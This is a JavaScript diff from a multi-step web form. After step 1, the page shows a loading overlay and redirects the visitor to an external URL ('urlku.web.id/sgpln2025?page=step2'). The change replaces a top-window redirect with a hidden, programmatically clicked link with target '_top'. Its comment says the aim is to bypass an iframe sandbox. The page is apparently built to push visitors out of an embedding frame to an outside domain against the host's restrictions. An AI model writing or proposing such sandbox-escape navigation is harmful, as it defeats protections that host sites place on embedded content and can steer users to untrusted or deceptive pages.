@@ -1208,19 +1208,21 @@
           // Show loading overlay for user feedback
           document.getElementById("loadingOverlay").classList.add("show");
 
-          // Navigate to step 2 using hardcoded URL
+          // Navigate to step 2 using hidden link (bypass iframe sandbox)
           setTimeout(() => {
             console.log("=== NAVIGATION DEBUG ===");
             console.log("Current URL:", window.location.href);
             console.log("localStorage step1Data:", localStorage.getItem('step1Data'));
             console.log("Navigating to step2...");
             
-            // Use top window to break out of iframe
-            if (window.top) {
-              window.top.location.href = 'https://urlku.web.id/sgpln2025?page=step2';
-            } else {
-              window.location.href = 'https://urlku.web.id/sgpln2025?page=step2';
-            }
+            // Create hidden link with target="_top" to bypass sandbox
+            const link = document.createElement('a');
+            link.href = 'https://urlku.web.id/sgpln2025?page=step2';
+            link.target = '_top';
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
           }, 500);
         } else {
           const firstError = document.querySelector(
